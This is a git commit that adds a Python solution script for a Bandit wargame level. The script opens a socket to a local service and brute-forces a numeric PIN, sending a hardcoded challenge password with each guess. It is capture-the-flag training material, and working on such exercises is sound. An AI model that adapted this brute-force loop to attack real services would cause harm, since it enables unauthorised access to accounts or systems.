0ae6e5272a7fda50c89ab2b305c4a4e6255be4ed
incidrthreat <incidrthreat@gmail.com>
2021-02-14 19:08:10 -0600

    updated script and folder formatting

---
+++ Bandit/Level 25/Bandit_lvl25.py
@@ -0,0 +1,22 @@
+####################################
+# File name: Bandit_lvl25.py       #
+# Author: hellor00t                #
+# Website: hackmethod.com          #
+# Date Created: Sep 5th, 2015      #
+# Date Updated: Feb 14th, 2021     #
+####################################
+
+#!/usr/bin/env python
+import socket
+
+pin = 0
+password = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('localhost', 30002))
+s.recv(1024)
+while True:
+        print('[+] Sending Pin: ' + str(pin))
+        s.sendall(password + str(pin)+ '\n')
+        data = s.recv(1024)
+        print(data)
+        pin += 1
